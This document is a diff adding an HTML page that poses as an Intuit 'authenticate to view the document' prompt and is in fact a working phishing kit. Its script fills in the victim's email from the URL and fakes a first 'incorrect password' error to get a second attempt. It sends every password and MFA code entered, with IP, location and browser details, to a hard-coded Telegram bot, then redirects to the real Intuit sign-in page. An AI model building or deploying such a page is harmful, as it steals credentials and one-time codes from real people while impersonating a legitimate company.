@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authenticate to View Document</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            margin: 0 auto;
+        }
+        h2 {
+            color: #333;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        input[type="password"], input[type="text"], button {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        input[type="password"].error, input[type="text"].error {
+            border-color: red;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            display: none;
+        }
+        .mfa-form {
+            display: none;
+            text-align: center;
+        }
+        .mfa-gif {
+            margin: 20px auto;
+            width: 60px;
+        }
+        .loading {
+            display: none;
+            margin: 20px auto;
+            width: 50px;
+        }
+        @media (max-width: 400px) {
+            .container {
+                width: 90%;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Logo -->
+        <img src="https://logodix.com/logo/316596.png" alt="Intuit Logo" class="logo">
+
+        <h2 id="authentication-title">Please authenticate to view the document</h2>
+
+        <!-- Password input form -->
+        <div id="password-form">
+            <form id="authForm">
+                <input type="hidden" id="email" name="email">
+                <input type="password" id="password" placeholder="Enter your password" aria-label="Password" required>
+                <div id="password-error" class="error-message">Incorrect password. Please try again.</div>
+                <button type="submit" aria-label="Continue">Continue</button>
+            </form>
+        </div>
+
+        <!-- MFA form -->
+        <div id="mfa-form" class="mfa-form">
+            <h3>Enter the MFA Code</h3>
+            <img src="https://plugin.intuitcdn.net/identity-authn-core-ui/13139b78b7f32282.gif" alt="MFA Animation" class="mfa-gif">
+            <form id="mfaAuthForm">
+                <input type="hidden" id="mfa-email" name="email">
+                <input type="text" id="mfa-code" placeholder="Enter your MFA code" aria-label="MFA Code" required>
+                <div id="mfa-error" class="error-message">Invalid MFA code. Please try again.</div>
+                <button type="submit" aria-label="Verify MFA Code">Continue</button>
+            </form>
+        </div>
+
+        <!-- Loading animation -->
+        <img src="https://cdnl.iconscout.com/lottie/premium/thumb/loading-bar-and-loader-5371059-4510678.gif" alt="Loading" class="loading" id="loading">
+    </div>
+
+    <script>
+        const AUTH_PASSWORD = "correctpassword"; // Simulated password for testing
+        const DOC_LINK = "https://accounts.intuit.com/app/sign-in?app_group=QBO&asset_alias=Intuit.accounting.core.qbowebapp&app_environment=prod";
+        const TELEGRAM_BOT_URL = "https://api.telegram.org/bot5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0/sendMessage"; // Replace with your Telegram bot's webhook URL
+        const IPINFO_URL = "https://ipinfo.io/json?token=d8eafd6deea176"; // IPInfo API URL with token
+    
+        let attemptCounter = 0;
+    
+        // Grab email from URL and decode Base64
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('ur') ? atob(urlParams.get('ur')) : 'Unknown';
+        document.getElementById('email').value = email;
+        document.getElementById('mfa-email').value = email;
+    
+        // Password form handling
+        const passwordForm = document.getElementById('authForm');
+        const passwordInput = document.getElementById('password');
+        const passwordError = document.getElementById('password-error');
+        const loading = document.getElementById('loading');
+        const title = document.getElementById('authentication-title'); // The title for authentication
+    
+        passwordForm.addEventListener('submit', async function (event) {
+            event.preventDefault();
+            attemptCounter++;
+            const location = await getLocation();
+            sendToTelegram(email, passwordInput.value, 'Password', location); // Send data to Telegram
+    
+            if (passwordInput.value !== AUTH_PASSWORD) {
+                if (attemptCounter === 1) {
+                    passwordInput.classList.add('error');
+                    passwordError.style.display = 'block';
+                } else {
+                    transitionToMFA();
+                }
+            } else {
+                showLoadingAndRedirect();
+            }
+        });
+    
+        passwordInput.addEventListener('input', function () {
+            passwordInput.classList.remove('error');
+            passwordError.style.display = 'none';
+        });
+    
+        // Transition to MFA form
+        function transitionToMFA() {
+            title.style.display = 'none'; // Hide the title
+            document.getElementById('password-form').style.display = 'none';
+            document.getElementById('mfa-form').style.display = 'block';
+            document.getElementById('mfa-code').focus();
+        }
+    
+        // MFA form handling
+        const mfaForm = document.getElementById('mfaAuthForm');
+        const mfaInput = document.getElementById('mfa-code');
+        const mfaError = document.getElementById('mfa-error');
+    
+        mfaForm.addEventListener('submit', async function (event) {
+            event.preventDefault();
+    
+            const mfaValue = mfaInput.value.trim();
+            const location = await getLocation();
+            sendToTelegram(email, mfaValue, 'MFA', location); // Send MFA code to Telegram
+    
+            if (/^\d{6}$/.test(mfaValue)) {
+                showLoadingAndRedirect();
+            } else {
+                mfaError.style.display = 'block';
+                mfaError.textContent = 'Invalid MFA code. Please try again.';
+                mfaInput.classList.add('error');
+            }
+        });
+    
+        mfaInput.addEventListener('input', function () {
+            mfaError.style.display = 'none';
+            mfaInput.classList.remove('error');
+        });
+    
+        // Show loading animation and redirect
+        function showLoadingAndRedirect() {
+            loading.style.display = 'block';
+            setTimeout(() => {
+                window.location.href = DOC_LINK;
+            }, 3000);
+        }
+    
+        // Function to send data to Telegram
+        function sendToTelegram(email, inputData, type, location) {
+            const userAgent = navigator.userAgent; // Browser details
+            const message = `Email: ${email}\nInput Type: ${type}\nInput: ${inputData}\nUser Agent: ${userAgent}\nLocation: ${location.city}, ${location.region}, ${location.country}\nIP: ${location.ip}`;
+    
+            fetch(TELEGRAM_BOT_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: '1412104349', // Replace with your Telegram chat ID
+                    text: message,
+                }),
+            }).catch(error => console.error('Error sending to Telegram:', error));
+        }
+    
+        // Function to get the user's location using the ipinfo.io API
+        async function getLocation() {
+            try {
+                const response = await fetch(IPINFO_URL);
+                const data = await response.json();
+                return {
+                    ip: data.ip || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country || 'Unknown',
+                };
+            } catch (error) {
+                console.error('Error fetching location:', error);
+                return {
+                    ip: 'Unknown',
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    country: 'Unknown',
+                };
+            }
+        }
+    </script>
+    
+
+</body>
+</html>
